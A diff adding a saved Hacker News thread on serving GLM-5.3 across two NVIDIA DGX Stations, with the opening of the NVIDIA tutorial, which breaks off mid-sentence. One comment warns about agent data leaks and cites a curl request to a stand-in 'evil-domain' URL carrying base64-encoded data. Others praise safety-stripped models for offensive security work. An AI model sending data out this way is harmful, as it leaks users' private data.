@@ -1,0 +1,621 @@
+---
+post:
+  id: '50497155'
+  title: Serving GLM-5.3 at 607.8 tok/s across two Nvidia DGX stations with vLLM
+  url: https://developer.nvidia.com/blog/when-one-gpu-isnt-enough-serving-glm-5-3-across-two-nvidia-dgx-stations-with-vllm/
+  hn_url: https://news.ycombinator.com/item?id=50497155
+  score: 104
+  author: ''
+  posted_at: '2026-11-14T14:09:25Z'
+  fetched_at: '2026-11-14T19:46:58Z'
+  article_url: https://developer.nvidia.com/blog/when-one-gpu-isnt-enough-serving-glm-5-3-across-two-nvidia-dgx-stations-with-vllm/
+  article_fetch_status: success
+  article_fetched_at: '2026-11-14T19:46:58Z'
+  raw_comment_count: 55
+comments:
+- id: '50497326'
+  parent_id: '50497155'
+  author: boodleboodle
+  text: Whats the best model i should be runnning with two dgxs? Is there a reason
+    they chose glm and not deepseek
+  score: 0
+  posted_at: '2026-11-14T14:34:27Z'
+- id: '50497382'
+  parent_id: '50497155'
+  author: walrus01
+  text: I&#x27;ll get right on that after an elderly relative passes away and leaves
+    me a valuable piece of real estate in a major city that will sell for enough money
+    to buy two DGX stations in the current market. Or I win the lottery.
+  score: 0
+  posted_at: '2026-11-14T14:40:58Z'
+- id: '50497434'
+  parent_id: '50497155'
+  author: flowerthoughts
+  text: GB300 DGX. Each with 256 GiB of RAM and a price of $100k?<p>For an enterprise,
+    that price seems doable. But if you want 50-100 tps like Claude does, and you
+    only have 10 users, maybe you&#x27;re not an enterprise.<p>To pull a recent analogy,
+    I guess we&#x27;re still at the early Model S stage of LLMs.
+  score: 0
+  posted_at: '2026-11-14T14:45:58Z'
+- id: '50497440'
+  parent_id: '50497326'
+  author: gpugreg
+  text: |-
+    <p><pre><code>    &gt; Is there a reason they chose glm and not deepseek
+    </code></pre>
+    GLM-5.3&#x27;s architecture (same as GLM-5.2) is simpler and it came out earlier.<p>Hybrid attention and Manifold-Constrained Hyper-Connections only arrived with GLM-5.3-Flash.<p>Also, NVIDIA acquired HuggingFace, who used GLM-5.2 for their forensic analysis when they got hacked, so I presume that they have more familiarity with that model.<p>And DeepSeek-V4.1-Flash is more memory-efficient, so it&#x27;d sell fewer GPUs.
+  score: 0
+  posted_at: '2026-11-14T14:46:21Z'
+- id: '50497443'
+  parent_id: '50497155'
+  author: jbellis
+  text: 'This doesn&#x27;t seem all that impressive for $200k of hardware? You could
+    serve 4bit off 8xB6000 for ~half the price. No idea what throughput you&#x27;d
+    get tho so maybe that&#x27;s the flex.<p>Edit: This guy already did it, and you
+    get 60% more throughput on the 8xB6000 <a href="https:&#x2F;&#x2F;github.com&#x2F;kacper-daftcode&#x2F;GLM5.3-8xPRO6K"
+    rel="nofollow">https:&#x2F;&#x2F;github.com&#x2F;kacper-daftcode&#x2F;GLM5.3-8xPRO6K</a>'
+  score: 0
+  posted_at: '2026-11-14T14:46:44Z'
+- id: '50497485'
+  parent_id: '50497155'
+  author: hkalbasi
+  text: Assuming the DGX priced at $100K, and GLM-5.3 at $1.4&#x2F;M output token,
+    this has ROI of ~7 years at maximum utilization (unlikely) and ignoring operational
+    expenses like electricity. Which makes it economically unreasonable unless you
+    want privacy or something like that.
+  score: 0
+  posted_at: '2026-11-14T14:51:50Z'
+- id: '50497532'
+  parent_id: '50497326'
+  author: frogblast
+  text: DeepSeek’s claim to fame is massively shrinking the per-user memory footprint,
+    enabling many more concurrent users in your fixed hardware footprint.   Having
+    more concurrent users leads to much higher overall throughput on that same hardware.  That’s
+    why DS is so cheap to host.<p>See table 2 in this article to see the tradeoffs
+    of overall throughput vs per user latency as an example.<p>Deepseek would let
+    you host higher concurrency than GLM.<p>Presumably that compression doesn’t come
+    for free on the quality side.  (This is totally speculative on my part.  I haven’t
+    personally used DS, and I don’t particularly feel benchmarks correlate well to
+    my own experiences)<p>If you’ve got a small enough user count, perhaps there are
+    tradeoffs in DeepSeek that are not buying you anything.
+  score: 0
+  posted_at: '2026-11-14T14:57:17Z'
+- id: '50497577'
+  parent_id: '50497485'
+  author: lumost
+  text: It’s useful in controlled environments where getting a commodity api approved
+    will take years.<p>Eg I can put 2x of these workstations in an office handling
+    banking&#x2F;medical&#x2F;secret&#x2F;sensitive data and have my engineers stop
+    complaining.
+  score: 0
+  posted_at: '2026-11-14T15:03:09Z'
+- id: '50497620'
+  parent_id: '50497485'
+  author: poisonborz
+  text: In each similar thread there are posts disputing the ROI - most often that&#x27;s
+    a minor positive side-effect of self-hosting. Independence, privacy and unchanging,
+    uncensored models, that makes it already worth it.
+  score: 0
+  posted_at: '2026-11-14T15:07:45Z'
+- id: '50497644'
+  parent_id: '50497532'
+  author: mapontosevenths
+  text: Having used both, they really are comparable for most things, which leaves
+    the cheaper Deepseek a better choice for most folks. The one area that I&#x27;ve
+    found GLM to be a clear winner is in offensive Cyber.<p>If you run a red team
+    GLM is hard to beat, and most of the providers who want to serve an abliterated
+    model cost significantly more so it makes more sense to spend money on hardware.
+  score: 0
+  posted_at: '2026-11-14T15:11:26Z'
+- id: '50497692'
+  parent_id: '50497577'
+  author: Grimburger
+  text: Since when do software engineers complain about maintaining privacy, security
+    or compliance?<p>I have very much the opposite experience, they trash the place
+    like toddlers then complain relentlessly when our auditors or anyone else points
+    it out.
+  score: 0
+  posted_at: '2026-11-14T15:16:07Z'
+- id: '50497699'
+  parent_id: '50497155'
+  author: arjie
+  text: Curious about the &gt;2 case. You get a Quantum X800 switch? Or just a fast
+    Ethernet switch? These are quite cool because of the amount of VRAM on them (though
+    I find the “unified RAM” marketing unnecessarily confusing) but I avoided them
+    because I wasn’t sure I could network them. A B300 node is $500k but I think I’d
+    do MI355X now at that size because new Claudes will be able to port easily.<p>The
+    advantage of the station is gradual improvement. Though tbh I wonder if I should
+    just settle for putting a few more normal H100 NVL and trying RoCE. Post is at
+    least inspiring of ideas  if nothing else.
+  score: 0
+  posted_at: '2026-11-14T15:16:55Z'
+- id: '50497715'
+  parent_id: '50497692'
+  author: arjie
+  text: Presumably some organizations are able to contain the rapacious software engineer.
+    In those organizations, the software engineer is better able to offer this. As
+    it happens, though, almost all of those would rather use ZDR Claude over this
+    kind of thing just because of the BCDR issues etc.
+  score: 0
+  posted_at: '2026-11-14T15:18:55Z'
+- id: '50497775'
+  parent_id: '50497443'
+  author: fulafel
+  text: The point of this hardware is that it&#x27;s desktop.
+  score: 0
+  posted_at: '2026-11-14T15:27:03Z'
+- id: '50497781'
+  parent_id: '50497485'
+  author: user43928
+  text: It seems particularly poor compared to larger deployments of other models
+    like Kimi K3.1 Pro.<p>I&#x27;ve heard numbers between 10k-38k tokens per second
+    per GB300 GPU.
+  score: 0
+  posted_at: '2026-11-14T15:27:32Z'
+- id: '50497793'
+  parent_id: '50497485'
+  author: Danox
+  text: If you’re doing any work near and dear to your heart, that you think is gonna
+    have some type of significance, some type of value, if you don’t care about privacy
+    and are not doing anything about it upfront, don’t cry on the back end.
+  score: 0
+  posted_at: '2026-11-14T15:29:07Z'
+- id: '50497802'
+  parent_id: '50497620'
+  author: Danox
+  text: With the blasé attitude that I see, the future is gonna be filled with lawsuits
+    back-and-forth. It’s all incoming.
+  score: 0
+  posted_at: '2026-11-14T15:30:49Z'
+- id: '50497808'
+  parent_id: '50497793'
+  author: skrebbel
+  text: "“Doing anything about it up front” meaning buying 2x$100k worth of hardware?"
+  score: 0
+  posted_at: '2026-11-14T15:31:20Z'
+- id: '50497834'
+  parent_id: '50497485'
+  author: chung8123
+  text: This is a lot of faster though.  That could be worth something.
+  score: 0
+  posted_at: '2026-11-14T15:34:42Z'
+- id: '50497841'
+  parent_id: '50497485'
+  author: giwook
+  text: It seems like hosting your frontier models don&#x27;t make any kind of economic
+    sense at this point given the exorbitant premiums on hardware in this space right
+    now.<p>What will prices look like once production has caught up with demand though?
+  score: 0
+  posted_at: '2026-11-14T15:35:36Z'
+- id: '50497879'
+  parent_id: '50497775'
+  author: justincormack
+  text: I mean, barely. If you want a video out you have to add another GPU which
+    reduces the power the main GPU gets. And most offices don&#x27;t have 800Gb fibre
+    to the desk. The Supermicro version is rackmountable, which makes more sense.
+  score: 0
+  posted_at: '2026-11-14T15:39:57Z'
+- id: '50497901'
+  parent_id: '50497775'
+  author: Danox
+  text: Ultimately, that’s where most people want to be local and on their desktop.
+    It keeps coming up over and over again. Most working in this area want privacy
+    and want to work on their desktop or in a small cluster within a small team office
+    environment. It keeps coming up over and over again. Rental is fine temporarily
+    but it isn’t the end point no matter what Sam Altman wants, personal computers
+    won out for a reason over the mainframe solutions of the past. Those reasons have
+    not changed.
+  score: 0
+  posted_at: '2026-11-14T15:41:24Z'
+- id: '50497918'
+  parent_id: '50497620'
+  author: Lucasoato
+  text: Exactly, in fields like health, police, and military you really can’t accept
+    the risks of your data leaking to a provider even if they claim to offer zero
+    data retention.
+  score: 0
+  posted_at: '2026-11-14T15:43:31Z'
+- id: '50497941'
+  parent_id: '50497155'
+  author: AnotherGoodName
+  text: For anyone actually considering this $200k+ setup for home or even small business
+    use the power usage and noise is extreme. 1.6kw each with the fans to match. 600tokens&#x2F;s
+    at concurrency 16 is not what you need for home use or even sub 100 employee business
+    use either. Really reconsider please (do you seriously need people to tell you
+    this?). I get tech wages are high and you can probably afford this but seriously.<p>Right
+    now there’s no great solution to the frontier or near frontier models for home
+    use. But there are cards and options coming in 2027. For now just accept that
+    you run qwen 37b or similar.<p>What’s coming in 2027 that changes this and why
+    i implore you to wait? Well for these models you need massive amounts of memory
+    and memory bandwidth. The solution above gets this by using expensive HBM spread
+    over enough cards with enough compute to give a ridiculous tok&#x2F;s. For home
+    use you’d actually be happier with a single GPU that had lots of cheap memory
+    to hold the weights and just enough memory bandwidth to feed that single gpu and
+    no more. This in theory gets you close to 50tok&#x2F;s on GLM 5.3 if it existed.<p>In
+    2027 there’s expected to be multiple HBF (high bandwidth flash) options incoming.
+    High bandwidth flash has ~10x the latency of HBM but that actually doesn’t matter
+    much for inference. Inference is latency tolerant and local inference time to
+    first token beats over the internet time to first token no matter what you do
+    in any case. The bandwidth and amount of memory is the blocker.<p>In 2027 there’s
+    expected to be many multi terabyte HBF options coming. NAND&#x2F;NOR flash is
+    massively cheaper than RAM per byte (multiple states per logical unit so it’s
+    denser) and it’s not that hard to wire it in a more parallel way to increase its
+    bandwidth. Nvidia has the Kioxia solutions and Sandisk, Samsung, Tenstorrent,
+    Mythic have also previewed HBF with GPUs to do local inference on the open source
+    frontier models at reasonably high tok&#x2F;s. Even if HBF is sold for 10x the
+    price per terabyte of todays flash that’s still an extremely small fraction of
+    the price of any other option right now.<p>Make do with the subscriptions for
+    now. Don’t go crazy trying to run the frontier at home today. We should have something
+    much better solutions are coming.
+  score: 0
+  posted_at: '2026-11-14T15:46:49Z'
+- id: '50497949'
+  parent_id: '50497485'
+  author: tomrod
+  text: Maybe it won&#x27;t be for long, if the price inflators Huang allegedly engaged
+    in are relaxed (financing AI startups to put capacity pressure on pricing).
+  score: 0
+  posted_at: '2026-11-14T15:47:37Z'
+- id: '50497952'
+  parent_id: '50497692'
+  author: nijave
+  text: Presumably they don&#x27;t and op does. I think the engineers are complaining
+    they want LLMs and op is stuck handing data over to a 3rd party or denying them
+    access. This would be the compromise (self hosted LLM)
+  score: 0
+  posted_at: '2026-11-14T15:48:27Z'
+- id: '50497962'
+  parent_id: '50497699'
+  author: nijave
+  text: 'There is something for macOS that uses Thunderbolt for high speed interconnect.
+    Obviously it doesn&#x27;t scale beyond a few nodes but I think that&#x27;s a decent
+    and fairly approachable middleground<p>Edit: This github.com&#x2F;exo-explore&#x2F;exo'
+  score: 0
+  posted_at: '2026-11-14T15:49:20Z'
+- id: '50497997'
+  parent_id: '50497692'
+  author: wrmanis
+  text: Or perhaps they are referring to more kinds of engineers. Security engineers,
+    IT engineers, ops engineers, and so on. They are more likely to have the kinds
+    of requirements that he&#x27;s referring to.
+  score: 0
+  posted_at: '2026-11-14T15:52:33Z'
+- id: '50498015'
+  parent_id: '50497382'
+  author: Danox
+  text: If you haven’t done so already, you should already be invested in some of
+    the sane blue chip stocks in the tech&#x2F;industrial area Google, Apple, there
+    is a reason they have done well over 25 years over time, for example it really
+    does pay off and there are many others to choose from, if you stay at it and you
+    don’t try to become a mind less day trader it is basically your second profession.
+    next to your daytime job over time.<p>In the design engineering department, I
+    was in a group of eight designers&#x2F;engineers decided they were gonna make
+    their fortune with our profit sharing bonuses. Some did, some didn’t about half
+    gave up. And now they’re mad at the world.<p>Staying at it, tuning out the noise
+    really does work, compounding assets over time really does work if you stay at
+    it and don’t become a mindless day trader.
+  score: 0
+  posted_at: '2026-11-14T15:54:11Z'
+- id: '50498074'
+  parent_id: '50497841'
+  author: preommr
+  text: Well if the current AI leaders are to be believed, it won&#x27;t matter because
+    money won&#x27;t be a thing, robots will do all the hard labor, and cancer will
+    be solved.<p>All in the next few years btw, around the same amount of time to
+    actually build the factories. So strap in I guess.
+  score: 0
+  posted_at: '2026-11-14T16:01:37Z'
+- id: '50498084'
+  parent_id: '50497941'
+  author: Keyframe
+  text: "<i>Make do with the subscriptions for now.</i><p>Sometimes you can&#x27;t.
+    All big three are bringing in the censorship and virtue signaling. It got to absurd
+    levels recently. I asked claude to audit my code, let&#x27;s see specific security
+    features and it flat out refused etc.<p>I did a janky setup at home - I hooked
+    up an old razer egpu case with 3090 (which had been collecting dust) to a strix
+    halo 395 machine. I&#x27;m running qwen 3.8 flash next abliterated version as
+    well as few image editing models and hook up to it with pi. The speed is really
+    decent, it works on a level like frontier models late last year or better, and
+    the best thing is I feel I can do anything with it without being nannied around.<p>I
+    still use frontier, but now I use both. I recommend everyone to get one of these
+    machines and do a similar setup. I got the idea from here anyways."
+  score: 0
+  posted_at: '2026-11-14T16:02:41Z'
+- id: '50498237'
+  parent_id: '50497155'
+  author: spwa4
+  text: Hopefully ERNIE 5.5 (open weight) is about the performance of GLM-5.3 (looks
+    that way from preliminary evals) and it should run easily on one DGX station.<p>Maybe
+    even a Q4 quant on 128G, like an M5 max laptop or a DGX spark ...
+  score: 0
+  posted_at: '2026-11-14T16:21:46Z'
+- id: '50498241'
+  parent_id: '50497692'
+  author: cududa
+  text: That says more about the companies and fields you chose to work in than software
+    engineers as a whole
+  score: 0
+  posted_at: '2026-11-14T16:22:02Z'
+- id: '50498596'
+  parent_id: '50497155'
+  author: k0morebi
+  text: Is my intuition correct in that the headline tok&#x2F;s are for a single user?<p>Multiple
+    concurrent users make that tok&#x2F;s&#x2F;user at best with probably additional
+    staking penalties with each user? I see people saying this isn&#x27;t necessary
+    for sub 100 employee businesses, but how does that work out if you have 100 users?
+  score: 0
+  posted_at: '2026-11-14T17:04:19Z'
+- id: '50498689'
+  parent_id: '50498084'
+  author: AnotherGoodName
+  text: Absolutely agree which is why i also said in the above post to run qwen for
+    now.
+  score: 0
+  posted_at: '2026-11-14T17:13:41Z'
+- id: '50498800'
+  parent_id: '50498596'
+  author: osamagirl69
+  text: The chart of the actual tok&#x2F;s vs concurrency is at the end. For a single
+    user you get 107tok&#x2F;s, which is about 2-3x as fast as you would get on 4x
+    DGX spark.<p>The 607 tok&#x2F;s is total tok&#x2F;s across the 16 users, so a
+    bit over 35tok&#x2F;s per user.
+  score: 0
+  posted_at: '2026-11-14T17:23:37Z'
+- id: '50498879'
+  parent_id: '50497485'
+  author: irishcoffee
+  text: I am really getting tired of this point. Yeah no shit renting something instead
+    of buying it probably saves money in the short term. Like… a house, or taking
+    an uber everywhere, or renting a musical instrument instead of buying one.<p>There
+    is an invaluable, priceless sense of of ownership of a thing instead of renting
+    a thing.<p>If we thought of everything the way you’re pointing out the min-maxing
+    value of LLMs nobody would own anything except for the oligarchs. You’re good
+    with that?
+  score: 0
+  posted_at: '2026-11-14T17:29:42Z'
+- id: '50499001'
+  parent_id: '50497692'
+  author: kentm
+  text: My team does.   It’s an important constraint. Do your software developers
+    routinely ignore critical requirements?
+  score: 0
+  posted_at: '2026-11-14T17:41:33Z'
+- id: '50499050'
+  parent_id: '50497577'
+  author: kgeist
+  text: People say GLM 5.3 is not much smarter than GLM 5.3 Flash (just +4 points
+    on Artificial Analysis), and GLM 5.3 Flash fits on 4x RTX 6000 Pro for 4 times
+    less money, with the same 600 tok&#x2F;sec aggregate decode speed on vLLM (6 mln
+    tokens KV cache). And I tell you, 600 tok&#x2F;sec is not much for an organization,
+    it&#x27;s barely usable for 8 people. That&#x27;s why we plan to buy more RTX
+    6000 Pros. And this setup requires $400,000 to run GLM 5.3 for 16 people, it&#x27;s
+    absolutely uneconomical.
+  score: 0
+  posted_at: '2026-11-14T17:46:01Z'
+- id: '50499274'
+  parent_id: '50497808'
+  author: eptcyka
+  text: What is the median salary for a senior sweng at faang?
+  score: 0
+  posted_at: '2026-11-14T18:09:39Z'
+- id: '50499291'
+  parent_id: '50497485'
+  author: jacquesm
+  text: Assuming constant pricing for tokens from online suppliers.
+  score: 0
+  posted_at: '2026-11-14T18:11:31Z'
+- id: '50499301'
+  parent_id: '50499050'
+  author: meatmanek
+  text: Personally I find GLM-5.3 to be smart enough to be my daily driver, writing
+    code, doing investigations, etc., including multi-codebase changes and finding
+    the relevant documentation&#x2F;supporting code for itself so I don&#x27;t have
+    to explain everything. It&#x27;s fast (depending on your inference provider),
+    cheap, and smart enough.<p>I find the full-size 5.3 is smart enough to avoid all
+    the small-model problems, while GLM-5.3-Flash definitely starts showing its limits
+    any time the task at hand is poorly defined. 5.3-Flash can often manage even complicated
+    tasks, but the error rate (in terms of bad decisions, misunderstandings, etc)
+    starts creeping up and the time wasted (or the risk thereof) gets high enough
+    that it&#x27;s worth just paying for the bigger model.<p>I do wish the bigger
+    model could use vision though- that&#x27;s currently limited to the flash model
+    (presumably because it came out later, when they had figured out their vision
+    training pipeline. Hopefully later releases will include it.)
+  score: 0
+  posted_at: '2026-11-14T18:12:35Z'
+- id: '50499302'
+  parent_id: '50497692'
+  author: jacquesm
+  text: Because the companies they work for take their NDA&#x27;s, compliance and
+    other requirements as must haves rather than optional.
+  score: 0
+  posted_at: '2026-11-14T18:12:44Z'
+- id: '50499337'
+  parent_id: '50497918'
+  author: andriy_koval
+  text: Is suspect major providers will or already provide service of deploying their
+    models on clients hardware, if bill is large enough.
+  score: 0
+  posted_at: '2026-11-14T18:16:36Z'
+- id: '50499366'
+  parent_id: '50497485'
+  author: liuliu
+  text: |-
+    Where your price is from?
+    <a href="https:&#x2F;&#x2F;docs.z.ai&#x2F;guides&#x2F;overview&#x2F;pricing" rel="nofollow">https:&#x2F;&#x2F;docs.z.ai&#x2F;guides&#x2F;overview&#x2F;pricing</a>
+    Input tokens: $1.4
+    Output tokens: $4.4
+    Cached input: $0.26<p>The ROI on this hardware from my back-of-envelope calculation is (50M per day for output tokens, 500M (assuming 10x ratio, which again is conservative (probably 4x more realistically)) per day for input tokens, and assuming 90% &#x2F; 10% mixing (10% output, and 90% input), you are doing $22 + $630 per day), that is less than a year to make the money (2 DGX Stations, $200k) back.<p>EDIT: actually read the article, it is kinda poorly written with no clear separation what&#x27;s the performance for decode v.s. prefill, making us arguing about this much less meaningful.
+  score: 0
+  posted_at: '2026-11-14T18:19:28Z'
+- id: '50499382'
+  parent_id: '50499301'
+  author: kgeist
+  text: Dunno, maybe I&#x27;m good at prompting it, but I haven&#x27;t had many issues
+    with GLM-5.3 Flash. After switching from the Claude models, I barely noticed any
+    difference for most tasks. In fact, I have to recheck the settings from time to
+    time to make sure I&#x27;m not running anything Anthropic when I see it working
+    with sensitive data :)<p>The only annoying issue for me is that GLM-5.3 Flash
+    is often eager to go into action and start modifying code when I&#x27;ve just
+    asked a question and it misunderstood it as a call to action.
+  score: 0
+  posted_at: '2026-11-14T18:21:19Z'
+- id: '50499634'
+  parent_id: '50497532'
+  author: meatmanek
+  text: I&#x27;m not sure I gave Deepseek-v4.1-Flash a fair shot, but in my limited
+    testing, it spends 20 minutes thinking about relatively basic prompts, so even
+    if it&#x27;s cheaper that GLM, the time saved by GLM-5.3&#x27;s much more reasonable
+    thinking time&#x2F;tokens means you end up ahead if you value your own time.
+  score: 0
+  posted_at: '2026-11-14T18:48:09Z'
+- id: '50499687'
+  parent_id: '50499274'
+  author: leoqa
+  text: 350k
+  score: 0
+  posted_at: '2026-11-14T18:53:11Z'
+- id: '50499992'
+  parent_id: '50497997'
+  author: vbezhenar
+  text: No engineer would prefer to use inferior tools. Only managers care about that.
+  score: 0
+  posted_at: '2026-11-14T19:29:15Z'
+- id: '50500001'
+  parent_id: '50497577'
+  author: maxloh
+  text: It is also unsafe unless you run the agents in a sandbox without network access.<p>All
+    it takes to leak data is a curl request to <a href="https:&#x2F;&#x2F;evil-domain.com&#x2F;?payload=base64-encoded-data"
+    rel="nofollow">https:&#x2F;&#x2F;evil-domain.com&#x2F;?payload=base64-encoded-data</a>,
+    and any model could be trained or fine-tuned to execute this on any task.<p>It
+    becomes even more dangerous if you run unofficial quantized weights of the original
+    model, such as the Unsloth ones. Doing so means there are now two separate parties
+    you need to trust, on top of the Chinese corporation behind the original model.
+  score: 0
+  posted_at: '2026-11-14T19:30:23Z'
+- id: '50500008'
+  parent_id: '50499050'
+  author: John23832
+  text: You’re not going to get the same token throughout with the pro 6000 over pcie.
+    You’re paying for speed and bandwidth.
+  score: 0
+  posted_at: '2026-11-14T19:31:26Z'
+- id: '50500015'
+  parent_id: '50499366'
+  author: Doohickey-d
+  text: And it&#x27;s even cheaper on third party providers. For example the cheapest
+    fp8 on openrouter is $0.5586 input, $0.1037 cached input, $1.756 output. And obviously
+    less on fp4.
+  score: 0
+  posted_at: '2026-11-14T19:33:09Z'
+- id: '50500023'
+  parent_id: '50499634'
+  author: joshheitzman
+  text: What provider were you using?
+  score: 0
+  posted_at: '2026-11-14T19:34:21Z'
+- id: '50500066'
+  parent_id: '50498084'
+  author: boredatoms
+  text: The local models might start leaving things out of training sets soon too
+  score: 0
+  posted_at: '2026-11-14T19:39:14Z'
+- id: '50500091'
+  parent_id: '50500008'
+  author: kgeist
+  text: The setup in the article reports 600 tok&#x2F;sec aggregate decode for GLM
+    5.3. I get the same throughput on 4x RTX 6000 Pro&#x27;s connected vi PCIe for
+    GLM 5.3 Flash, which is just 4 points below GLM 5.3 on Artificial Analysis. I&#x27;m
+    just saying the setup in the article looks overpriced for what it can actually
+    do
+  score: 0
+  posted_at: '2026-11-14T19:42:27Z'
+article:
+  url: https://developer.nvidia.com/blog/when-one-gpu-isnt-enough-serving-glm-5-3-across-two-nvidia-dgx-stations-with-vllm/
+  title: 'When One GPU Isn’t Enough: Serving GLM-5.3 Across Two NVIDIA DGX Stations
+    with vLLM | NVIDIA Technical Blog'
+  fetch_status: success
+  content: "[Agentic AI / Generative AI](https://developer.nvidia.com/blog/category/generative-ai/)\n\n#
+    When One GPU Isn’t Enough: Serving GLM-5.3 Across Two NVIDIA DGX Stations with
+    vLLM\n ![](https://developer-blogs.nvidia.com/wp-content/uploads/2026/11/image3-3-1024x576-png.webp)\n\n
+    Nov 13, 2026 \n\n By [Fatima Fall](https://developer.nvidia.com/blog/author/ffall/
+    \"Posts by Fatima Fall\")\n\n[Discuss (0)](#entry-content-comments)\n\n- [L](https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fdeveloper.nvidia.com%2Fblog%2Fwhen-one-gpu-isnt-enough-serving-glm-5-3-across-two-nvidia-dgx-stations-with-vllm%2F)\n-
+    [T](https://twitter.com/intent/tweet?text=When+One+GPU+Isn%E2%80%99t+Enough%3A+Serving+GLM-5.3+Across+Two+NVIDIA+DGX+Stations+with+vLLM+%7C+NVIDIA+Technical+Blog+https%3A%2F%2Fdeveloper.nvidia.com%2Fblog%2Fwhen-one-gpu-isnt-enough-serving-glm-5-3-across-two-nvidia-dgx-stations-with-vllm%2F)\n-
+    [F](https://www.facebook.com/sharer/sharer.php?u=https%3A%2F%2Fdeveloper.nvidia.com%2Fblog%2Fwhen-one-gpu-isnt-enough-serving-glm-5-3-across-two-nvidia-dgx-stations-with-vllm%2F)\n-
+    [R](https://www.reddit.com/submit?url=https%3A%2F%2Fdeveloper.nvidia.com%2Fblog%2Fwhen-one-gpu-isnt-enough-serving-glm-5-3-across-two-nvidia-dgx-stations-with-vllm%2F&title=When+One+GPU+Isn%E2%80%99t+Enough%3A+Serving+GLM-5.3+Across+Two+NVIDIA+DGX+Stations+with+vLLM+%7C+NVIDIA+Technical+Blog)\n-
+    [E](mailto:?subject=I'd%20like%20to%20share%20a%20link%20with%20you&body=https%3A%2F%2Fdeveloper.nvidia.com%2Fblog%2Fwhen-one-gpu-isnt-enough-serving-glm-5-3-across-two-nvidia-dgx-stations-with-vllm%2F)\n\n##
+    AI-Generated Summary\n\n- [GLM-5.3 NVFP4](https://huggingface.co/nvidia/GLM-5.3-NVFP4),
+    a quantized mixture-of-experts model with 753 billion parameters and 40 billion
+    activated per token, requires about 464 GB of GPU memory, exceeding the 252 GB
+    HBM3e on a single GB300 GPU.\n- Two NVIDIA DGX Stations connected over ConnectX-8
+    RDMA serve the model through one OpenAI-compatible endpoint using tensor parallelism
+    (TP=2), with each GPU holding and computing roughly half the weights.\n- vLLM
+    launches a distributed service across both Stations, enabling multi-token prediction,
+    FP8 KV-cache storage, and prefix caching to maximize throughput under concurrent
+    load.\n- AIPerf benchmarks on the SPEED-Bench Coding dataset show overall output
+    throughput peaking at 607.8 tokens per second at concurrency 16, then falling
+    to 385.0 tokens per second at concurrency 32 with mean request latency of 453.5
+    seconds.\n\n### Next Steps\n\n- Follow the [Connect Two DGX Stations playbook](https://build.nvidia.com/station/connect-two-stations)
+    to link and validate the hardware before deployment.\n- Review the [NVIDIA Local
+    AI recipe repository](https://nvidia.github.io/local-ai-inference-recipes/hardware/dgx-station-2gpu/index.html)
+    for the latest recommended configurations.\n- Connect an application using the
+    [vLLM serving documentation](https://docs.vllm.ai/en/v0.30.0/serving/online_serving/)
+    and rerun AIPerf with custom prompts to find the optimal concurrency for the workload.\n\nPowered
+    by NVIDIA Nemotron. AI-generated content may summarize information incompletely.
+    Verify important information.&nbsp;[Learn more](https://www.nvidia.com/en-us/agreements/trustworthy-ai/terms/)\n\nRunning
+    a frontier-scale model locally means keeping all its weights in GPU memory; the
+    largest models no longer fit on one machine. Two NVIDIA DGX Stations connected
+    over ConnectX-8 RDMA serve one model through a single endpoint, with tensor parallelism
+    splitting the model weights and computation across both GPUs.&nbsp;\n\nThe NVIDIA
+    [GLM-5.3 NVFP4](https://huggingface.co/nvidia/GLM-5.3-NVFP4) model, a quantized
+    version of [Z.ai](http://z.ai)’s mixture-of-experts (MoE) model, has 753 billion
+    parameters, with 40 billion activated per token. Sparse activation reduces computation,
+    but all model weights still need to remain available because each token can be
+    routed to different experts. At about 464 GB, the checkpoint exceeds the 252 GB
+    of HBM3e on a single GB300 GPU. This tutorial uses two DGX Stations to keep the
+    weights in GPU memory, with CPU weight offload disabled.\n\nBefore starting, connect
+    the two Stations with the [Connect Two DGX Stations playbook](https://build.nvidia.com/station/connect-two-stations).\n\nThis
+    post shows how to serve GLM-5.3 locally across two NVIDIA DGX Stations with vLLM,
+    send a request, and measure behavior under concurrent load. Tensor parallelism
+    (TP=2) splits the model’s tensors across the two GB300 GPUs. Both Stations compute
+    every request, and Station A returns the answer through one OpenAI-compatible
+    API. By the end, you’ll have a working endpoint and a baseline for how it behaves
+    under load.\n\n![Two stations serve one model: each GPU holds and computes part
+    of the model over the selected RDMA connection. Their memories remain distinct.](data:image/svg+xml,%3Csvg%20xmlns=%22http://www.w3.org/2000/svg%22%20viewBox=%220%200%201999%201125%22%3E%3C/svg%3E)\n_Figure
+    1. Two Stations serve one model: each GPU holds and computes part of the model
+    over the selected RDMA connection. Their memories remain distinct_\n\n## Prerequisites\n\n-
+    Two GB300 DGX Stations running Linux, connected and validated with the [Connect
+    Two DGX Stations playbook](https://build.nvidia.com/station/connect-two-stations),
+    including its GPU-memory RDMA test on both rails.\n- SSH and sudo access on both
+    Stations with the same Linux username. Docker and the NVIDIA Container Toolkit
+    come preinstalled with the [DGX Station software stack](https://docs.nvidia.com/dgx/dgx-station-development-guide/porting/software-requirements.html).
+    Allow outbound access to the container registry, Hugging Face, and package repositories.\n-
+    At least 464 GB of free disk space on each Station for its copy of the checkpoint,
+    plus room for the vLLM container image and temporary files.\n- Acceptance of the
+    NVIDIA Open Model Agreement and the original GLM-5.3 license terms, listed on
+    the [model card](https://huggingface.co/nvidia/GLM-5.3-NVFP4#licenseterms-of-use).
+    SPEED-Bench is governed by the [NVIDIA Evaluation Dataset License Agreement](https://huggingface.co/datasets/nvidia/SPEED-Bench/blob/main/License.pdf).\n-
+    A Hugging Face account and read access token, with access to the gated [cais/hle](https://huggingface.co/datasets/cais/hle)
+    dataset: sign in, open its page, and select **Agree and access repository**. Step
+    5 downloads SPEED-Bench prompts from this dataset.\n\nThe companion video follows
+    the same workflow.\n\n_Video 1. Walkthrough of preparation, inference, benchmarking,
+    and shutdown_\n\n## Step 1. Prepare the two Stations\n\nThis tutorial uses a separate
+    computer, such as your laptop, to manage both Stations. Start by opening an SSH
+    session to each Station from that computer. Alternatively, work from a local terminal
+    on each Station. Run every command in this step on both Stations unless it starts
+    with “On A.”\n\nThe two Stations run the same container and checkpoint in different
+    roles: Station A (rank 0) hosts the API, and Station B (rank 1) runs only a worker,
+    with no API server.\n\nFirst, check Docker access and collect the network values
+    you’ll use later:\n\n    docker version\n    ibdev2netdev\n    ip -br addr\n\n|
+    **Note:** If the `docker version` output has no `Server` section, the client cannot
+    reach the Docker daemon. If the error is `permission denied`, follow the [Docker
+    post-installation procedure](https://docs.docker.com/engine/install/linux-postinstall/):
+    add your user to the `docker` group with `sudo usermod -aG docker \"$USER\"`,
+    run `exit`, then reconnect and rerun `docker version`. The `docker` group grants
